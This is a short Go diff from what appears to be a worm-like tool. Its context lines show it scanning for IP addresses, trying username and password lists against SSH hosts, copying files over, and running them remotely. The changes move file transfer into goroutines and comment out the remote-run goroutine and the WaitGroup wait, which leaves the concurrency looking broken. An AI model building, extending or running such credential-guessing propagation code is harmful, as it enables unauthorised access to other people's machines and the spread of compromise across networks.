@@ -37,13 +37,24 @@ func main() {
 		fmt.Println("Dependencies installed")
 	}
 	if isTarget && !isDemo {
-		transferFiles([]string{targetIP})
+		if isThreaded {
+			wg.Add(1)
+			go transferFiles([]string{targetIP})
+		} else {
+			transferFiles([]string{targetIP})
+		}
+
 	} else {
 		ips := findIPs()
 		fmt.Print("IP list: ")
 		fmt.Println(ips)
 		if !isDemo {
-			transferFiles(ips)
+			if isThreaded {
+				wg.Add(1)
+				go transferFiles(ips)
+			} else {
+				transferFiles(ips)
+			}
 		}
 	}
 
@@ -147,8 +158,9 @@ func transferFiles(ips []string) {
 							fmt.Println("Files sent")
 						}
 						if isThreaded {
-							wg.Add(1)
-							go runRemote(usernames[u], passwords[p], ips[i])
+							//wg.Add(1)
+							/*go */
+							runRemote(usernames[u], passwords[p], ips[i])
 						} else {
 							runRemote(usernames[u], passwords[p], ips[i])
 						}
@@ -171,9 +183,9 @@ func transferFiles(ips []string) {
 			fmt.Println("Host " + ips[i] + " does not have SSH enabled. Skipping...")
 		}
 	}
-	if isThreaded {
-		wg.Wait()
-	}
+	// if isThreaded {
+	// 	wg.Wait()
+	// }
 
 }
 
